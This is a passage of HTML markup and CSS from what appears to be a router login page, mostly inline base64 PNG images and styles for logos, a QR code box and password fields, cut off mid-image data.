                <i class="des" style="background: url('data:image/png;base64,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') no-repeat;"></i>
            </div>
        </ul>
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAACgee/qAAABlVBMVEVMcrH///+LwPGLwPFMcrFMcrGLwPGLwPGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPGLwPFMcrFMcrGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPFgisWLwPGLwPFMcrFMcrGLwPFMcrGLwPFMcrFMcrFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrFMcrGLwPGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPF/suWLwPFMcrGLwPFRebeLwPGKvvCLwPFMcrGLwPGLwPFMcrGLwPFMcrFMcrGLwPGCtehMcrGLwPGLwPFMcrFMcrGLwPGAsuWLwPFMcrGLwPFMcrGLwPFMcrF4qd5Zgr5NdLNchsJgi8VhjMZijshjjshkj8l+sOSDtumEt+mGuuxvndRwntV1pNpQeLZlkctmkstnk8xolc5SebdXgLyJve+Kv/B2ptww1xRlAAAAa3RSTlMAAAADAwYGCQ8SEhUVGBseISEnJyoqMDAzMzY2PEJCREhLS1FRVFdXWl1gYGNmZmlpbGxvcniHjY2QkJOWmZ+lpaioq6uxtLS3vcDDyczMzs/S0tLV1tve4efn6urt7e7w8PPz9vb5+fn8/O8TbxAAAAIUSURBVHhevND9K0NhGMbxZTpMEBotzAYwQiCxgwmMdWgkMymT5ux6AAAA+LvNOMPGdp49L9/f7rrqU7cljzVb07B/GUBI8w26lKxzixEj65zS8aPtqZ4yGbB9FukFOxXBsDKk48/CA4UiYdsc/i3SZxUGl68iU4sVguDSzC4QcQuBlQCyFW0RAQ8he7qHP+zUYaKokxW2OntVdVT1euxf9zJMFbIxwa6ZCIw2VUcc7oLJxhhgt5YCBGqsKzCZXpUrrIwgvXmYbiE/N7hUA1uvS5W5wIVBsHay1UAPW/1gbpfstFLDfWDvkpBYByVcEAaHngjZqaOD3eDRASFkrYgK9oJHRyTeOBXsB49OP+BYNQ28CB7dk48m5MPHCThWJP3VhyRROwWsgkd7n/A0BdwPHt1+wusUsAscOidflWSECxzxarsSjfjAoTcDrvsHrupV5zXw79GAm/+CK7whCOrZgDvS4WIfhHVBjLrTYEcY4rpKwm2psF2ki/Ozs5vru719QhpTYQ0Setl9qE+B3ZBU1FfzCx6DvCbLf8BBSCzS8g2HITVPEobcNpLwJpK9LzS+jGYgzQ8MHPWwVBISMTm0A+a4mz4iMTk0BOG+vg6WuhKsCIsZGRkhDN8cOoAUN0NuNIuVcugEMpykUCx2yKEfcBZAsjgwh44gWR1hcUwOXYE23OIc+oJYuMUJOXAQ6Etz4KQLANvBSXPMqyDGAAAAAElFTkSuQmCC" class="loginBgS">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAACgee/qAAABlVBMVEVMcrH///+LwPGLwPFMcrFMcrGLwPGLwPGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPGLwPFMcrFMcrGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPFgisWLwPGLwPFMcrFMcrGLwPFMcrGLwPFMcrFMcrFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrFMcrGLwPGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPF/suWLwPFMcrGLwPFRebeLwPGKvvCLwPFMcrGLwPGLwPFMcrGLwPFMcrFMcrGLwPGCtehMcrGLwPGLwPFMcrFMcrGLwPGAsuWLwPFMcrGLwPFMcrGLwPFMcrF4qd5Zgr5NdLNchsJgi8VhjMZijshjjshkj8l+sOSDtumEt+mGuuxvndRwntV1pNpQeLZlkctmkstnk8xolc5SebdXgLyJve+Kv/B2ptww1xRlAAAAa3RSTlMAAAADAwYGCQ8SEhUVGBseISEnJyoqMDAzMzY2PEJCREhLS1FRVFdXWl1gYGNmZmlpbGxvcniHjY2QkJOWmZ+lpaioq6uxtLS3vcDDyczMzs/S0tLV1tve4efn6urt7e7w8PPz9vb5+fn8/O8TbxAAAAIUSURBVHhevND9K0NhGMbxZTpMEBotzAYwQiCxgwmMdWgkMymT5ux6AAAA+LvNOMPGdp49L9/f7rrqU7cljzVb07B/GUBI8w26lKxzixEj65zS8aPtqZ4yGbB9FukFOxXBsDKk48/CA4UiYdsc/i3SZxUGl68iU4sVguDSzC4QcQuBlQCyFW0RAQ8he7qHP+zUYaKokxW2OntVdVT1euxf9zJMFbIxwa6ZCIw2VUcc7oLJxhhgt5YCBGqsKzCZXpUrrIwgvXmYbiE/N7hUA1uvS5W5wIVBsHay1UAPW/1gbpfstFLDfWDvkpBYByVcEAaHngjZqaOD3eDRASFkrYgK9oJHRyTeOBXsB49OP+BYNQ28CB7dk48m5MPHCThWJP3VhyRROwWsgkd7n/A0BdwPHt1+wusUsAscOidflWSECxzxarsSjfjAoTcDrvsHrupV5zXw79GAm/+CK7whCOrZgDvS4WIfhHVBjLrTYEcY4rpKwm2psF2ki/Ozs5vru719QhpTYQ0Setl9qE+B3ZBU1FfzCx6DvCbLf8BBSCzS8g2HITVPEobcNpLwJpK9LzS+jGYgzQ8MHPWwVBISMTm0A+a4mz4iMTk0BOG+vg6WuhKsCIsZGRkhDN8cOoAUN0NuNIuVcugEMpykUCx2yKEfcBZAsjgwh44gWR1hcUwOXYE23OIc+oJYuMUJOXAQ6Etz4KQLANvBSXPMqyDGAAAAAElFTkSuQmCC" class="loginBgT">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAACgee/qAAABlVBMVEVMcrH///+LwPGLwPFMcrFMcrGLwPGLwPGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPGLwPFMcrFMcrGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPFgisWLwPGLwPFMcrFMcrGLwPFMcrGLwPFMcrFMcrFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrFMcrGLwPGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPF/suWLwPFMcrGLwPFRebeLwPGKvvCLwPFMcrGLwPGLwPFMcrGLwPFMcrFMcrGLwPGCtehMcrGLwPGLwPFMcrFMcrGLwPGAsuWLwPFMcrGLwPFMcrGLwPFMcrF4qd5Zgr5NdLNchsJgi8VhjMZijshjjshkj8l+sOSDtumEt+mGuuxvndRwntV1pNpQeLZlkctmkstnk8xolc5SebdXgLyJve+Kv/B2ptww1xRlAAAAa3RSTlMAAAADAwYGCQ8SEhUVGBseISEnJyoqMDAzMzY2PEJCREhLS1FRVFdXWl1gYGNmZmlpbGxvcniHjY2QkJOWmZ+lpaioq6uxtLS3vcDDyczMzs/S0tLV1tve4efn6urt7e7w8PPz9vb5+fn8/O8TbxAAAAIUSURBVHhevND9K0NhGMbxZTpMEBotzAYwQiCxgwmMdWgkMymT5ux6AAAA+LvNOMPGdp49L9/f7rrqU7cljzVb07B/GUBI8w26lKxzixEj65zS8aPtqZ4yGbB9FukFOxXBsDKk48/CA4UiYdsc/i3SZxUGl68iU4sVguDSzC4QcQuBlQCyFW0RAQ8he7qHP+zUYaKokxW2OntVdVT1euxf9zJMFbIxwa6ZCIw2VUcc7oLJxhhgt5YCBGqsKzCZXpUrrIwgvXmYbiE/N7hUA1uvS5W5wIVBsHay1UAPW/1gbpfstFLDfWDvkpBYByVcEAaHngjZqaOD3eDRASFkrYgK9oJHRyTeOBXsB49OP+BYNQ28CB7dk48m5MPHCThWJP3VhyRROwWsgkd7n/A0BdwPHt1+wusUsAscOidflWSECxzxarsSjfjAoTcDrvsHrupV5zXw79GAm/+CK7whCOrZgDvS4WIfhHVBjLrTYEcY4rpKwm2psF2ki/Ozs5vru719QhpTYQ0Setl9qE+B3ZBU1FfzCx6DvCbLf8BBSCzS8g2HITVPEobcNpLwJpK9LzS+jGYgzQ8MHPWwVBISMTm0A+a4mz4iMTk0BOG+vg6WuhKsCIsZGRkhDN8cOoAUN0NuNIuVcugEMpykUCx2yKEfcBZAsjgwh44gWR1hcUwOXYE23OIc+oJYuMUJOXAQ6Etz4KQLANvBSXPMqyDGAAAAAElFTkSuQmCC" class="loginBgFi">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAACgee/qAAABlVBMVEVMcrH///+LwPGLwPFMcrFMcrGLwPGLwPGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPGLwPFMcrFMcrGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPFgisWLwPGLwPFMcrFMcrGLwPFMcrGLwPFMcrFMcrFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrFMcrGLwPGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPF/suWLwPFMcrGLwPFRebeLwPGKvvCLwPFMcrGLwPGLwPFMcrGLwPFMcrFMcrGLwPGCtehMcrGLwPGLwPFMcrFMcrGLwPGAsuWLwPFMcrGLwPFMcrGLwPFMcrF4qd5Zgr5NdLNchsJgi8VhjMZijshjjshkj8l+sOSDtumEt+mGuuxvndRwntV1pNpQeLZlkctmkstnk8xolc5SebdXgLyJve+Kv/B2ptww1xRlAAAAa3RSTlMAAAADAwYGCQ8SEhUVGBseISEnJyoqMDAzMzY2PEJCREhLS1FRVFdXWl1gYGNmZmlpbGxvcniHjY2QkJOWmZ+lpaioq6uxtLS3vcDDyczMzs/S0tLV1tve4efn6urt7e7w8PPz9vb5+fn8/O8TbxAAAAIUSURBVHhevND9K0NhGMbxZTpMEBotzAYwQiCxgwmMdWgkMymT5ux6AAAA+LvNOMPGdp49L9/f7rrqU7cljzVb07B/GUBI8w26lKxzixEj65zS8aPtqZ4yGbB9FukFOxXBsDKk48/CA4UiYdsc/i3SZxUGl68iU4sVguDSzC4QcQuBlQCyFW0RAQ8he7qHP+zUYaKokxW2OntVdVT1euxf9zJMFbIxwa6ZCIw2VUcc7oLJxhhgt5YCBGqsKzCZXpUrrIwgvXmYbiE/N7hUA1uvS5W5wIVBsHay1UAPW/1gbpfstFLDfWDvkpBYByVcEAaHngjZqaOD3eDRASFkrYgK9oJHRyTeOBXsB49OP+BYNQ28CB7dk48m5MPHCThWJP3VhyRROwWsgkd7n/A0BdwPHt1+wusUsAscOidflWSECxzxarsSjfjAoTcDrvsHrupV5zXw79GAm/+CK7whCOrZgDvS4WIfhHVBjLrTYEcY4rpKwm2psF2ki/Ozs5vru719QhpTYQ0Setl9qE+B3ZBU1FfzCx6DvCbLf8BBSCzS8g2HITVPEobcNpLwJpK9LzS+jGYgzQ8MHPWwVBISMTm0A+a4mz4iMTk0BOG+vg6WuhKsCIsZGRkhDN8cOoAUN0NuNIuVcugEMpykUCx2yKEfcBZAsjgwh44gWR1hcUwOXYE23OIc+oJYuMUJOXAQ6Etz4KQLANvBSXPMqyDGAAAAAElFTkSuQmCC" class="loginBgSi">
    </div>
    <style type="text/css">
        body {background-position:1688px 535px; background-size:66px 32px; background-color:#5e85c0; background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAyCAMAAACgee/qAAABlVBMVEVMcrH///+LwPGLwPFMcrFMcrGLwPGLwPGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPGLwPFMcrFMcrGLwPGLwPFMcrFMcrGLwPFMcrGLwPGLwPFMcrGLwPFgisWLwPGLwPFMcrFMcrGLwPFMcrGLwPFMcrFMcrFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPFMcrFMcrGLwPGLwPFMcrGLwPGLwPGLwPGLwPGLwPGLwPFMcrGLwPF/suWLwPFMcrGLwPFRebeLwPGKvvCLwPFMcrGLwPGLwPFMcrGLwPFMcrFMcrGLwPGCtehMcrGLwPGLwPFMcrFMcrGLwPGAsuWLwPFMcrGLwPFMcrGLwPFMcrF4qd5Zgr5NdLNchsJgi8VhjMZijshjjshkj8l+sOSDtumEt+mGuuxvndRwntV1pNpQeLZlkctmkstnk8xolc5SebdXgLyJve+Kv/B2ptww1xRlAAAAa3RSTlMAAAADAwYGCQ8SEhUVGBseISEnJyoqMDAzMzY2PEJCREhLS1FRVFdXWl1gYGNmZmlpbGxvcniHjY2QkJOWmZ+lpaioq6uxtLS3vcDDyczMzs/S0tLV1tve4efn6urt7e7w8PPz9vb5+fn8/O8TbxAAAAIUSURBVHhevND9K0NhGMbxZTpMEBotzAYwQiCxgwmMdWgkMymT5ux6AAAA+LvNOMPGdp49L9/f7rrqU7cljzVb07B/GUBI8w26lKxzixEj65zS8aPtqZ4yGbB9FukFOxXBsDKk48/CA4UiYdsc/i3SZxUGl68iU4sVguDSzC4QcQuBlQCyFW0RAQ8he7qHP+zUYaKokxW2OntVdVT1euxf9zJMFbIxwa6ZCIw2VUcc7oLJxhhgt5YCBGqsKzCZXpUrrIwgvXmYbiE/N7hUA1uvS5W5wIVBsHay1UAPW/1gbpfstFLDfWDvkpBYByVcEAaHngjZqaOD3eDRASFkrYgK9oJHRyTeOBXsB49OP+BYNQ28CB7dk48m5MPHCThWJP3VhyRROwWsgkd7n/A0BdwPHt1+wusUsAscOidflWSECxzxarsSjfjAoTcDrvsHrupV5zXw79GAm/+CK7whCOrZgDvS4WIfhHVBjLrTYEcY4rpKwm2psF2ki/Ozs5vru719QhpTYQ0Setl9qE+B3ZBU1FfzCx6DvCbLf8BBSCzS8g2HITVPEobcNpLwJpK9LzS+jGYgzQ8MHPWwVBISMTm0A+a4mz4iMTk0BOG+vg6WuhKsCIsZGRkhDN8cOoAUN0NuNIuVcugEMpykUCx2yKEfcBZAsjgwh44gWR1hcUwOXYE23OIc+oJYuMUJOXAQ6Etz4KQLANvBSXPMqyDGAAAAAElFTkSuQmCC'); background-repeat:no-repeat; font-size:12px; height:100%}
        div.logo {width:980px; height:60px; margin:0 auto; position:relative}
        .tpLogo {display:inline-block; width:131px; height:100%}
        .andlinkLogo {display:inline-block; width:205px; height:100%}
        .elinkLogo {display:inline-block; width:214px; height:100%}
        .andlinkQRcode {width:170px; height:102px; padding:12px; margin:60px 0 0 65px; background:#fff; box-sizing:border-box}
        .andlinkQRcode i.des {display:inline-block; height:30px; width:60px; margin:24px 0 24px 8px}
        div.lgCon {width:980px; margin:0 auto; position:relative}
        div.lgCon ul.lg {font-size:0; margin:125px 0 0 340px; list-style:none; width:550px}
        li.lgTitle {color:#fff; font-size:24px; font-weight:bold; margin-bottom:35px}
        li.lgInput {margin-bottom:25px}
        ul.lgPwd {font-size:0; height:35px; position:relative; list-style:none; *zoom:1}
        ul.lgPwd li.inputPwd {background:#fff; border-radius:3px; float:left; font-size:0; height:35px; line-height:35px; overflow:hidden; width:300px }
        li.inputPwd label.pwd {border-right:1px solid #5e85bf; color:#3c3e43; display:inline-block; font-size:14px; line-height:35px; text-align:center; vertical-align:top; width:50px}
        @media screen and (-webkit-min-device-pixel-ratio:0){li.inputPwd input{line-height:0!important}}
        li.inputPwd input {background:#fff; border:0; font-size:12px; height:35px; *height:34px; line-height:35px; *line-height:34px; margin-left:9px; padding:0; vertical-align:top; width:230px;}
        ul.lgPwd li.pwdNote {float:left; height:35px; line-height:35px; visibility:hidden; width:250px}
        #pwdTipStr, #usrTipStr {background:#fff; color:#a6a6a6; height:30px; *line-height:34px; font-size:12px; left:56px; position:absolute; top:1px}
        i.tip {background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAmwAAAHNCAMAAACU49fBAAAC9FBMVEUAAAA2Vyf+/vv///////////9HNRz///////////////////z/////////////PQH+/v7///////////////////8fl9X8/Pz////////////+//////////////////////////////////////////////////////8YExX///////////8iqMn+//8SERR23AkjnNb///8eltUZFRj///////////8eltX///8eltXU8/HVYTVp1AgeosseltUel9UCAgLMzcdd2wAln9bW19Vc2wDVYjUhmtVY3AXdXizUYjUknNdc2wAeltVc2wBc2wAdoM5d2wAGv6Zc2gD3+fhc2wBc2wAlntYMwacFvqXUYzj09fXZYDRc2wCevhxd2wALxqnVYjXv7u7byg1c2wDVYjWgviP429HVYzXmo4k3tNqfviFd2wD86RrVYzbhj28Hu6M3tNo4tdumwy4BuaPw3hHaYTChvySiwSZSvt8BuaP4TQz/6xn/6xpAQTzv2wHOzs6evh0It6A4tdve1mMIu6P57m/01cnn1Q7N0c3psZzl7b8QERL+6xr3UA62z1aevhwEt6H/6xoLtqDg4+PwXhbVYjXP0tLW2tru8/Dq4GuIg4Pw5mz6+viCmSALx6qtyDb+6xmmwjamxCz+6xqCmR8W4y+Cmh/b3qQfp5O26ucX4i8sxbOI1uK/1Gh62NTjmHp71tlYzcm/1GkX4i+/1Gn///8eltRc2gDUYjWevh03tNoAuKL+6xqCmiD04AD/83EMxakfp5P6/fuqxjXtwLLyXhjF7+3Z2dkX4i/m+PaB3dJG0L3x+vgnx7FW08KV5dqy6+X88Obr9NXMzMz9rpEFzkltyeWH5EPO4YuvGRmgt9nf78b3y76n2+36gVCJgStv2cv/j2u80WP/6LrZ5aeM1OprZjFS5HO39MSp43fMvRbL5ror2lyknVVehb955pv/tiofygDF2HfPalykmRzZz2UAAACX7LTVhob/z3L05gDCAAAAt3RSTlMABAaC9/II7crlwgtJtdn+EabfZTxXgRd4Q1AbH5nPNV6ffXK71CiJqyYwsGkNLRkQS5DtD41uJLaUkf6dIBjcpU0wSl1M2+hsNkpmPfHKvM4hZUrm3qz5L4rL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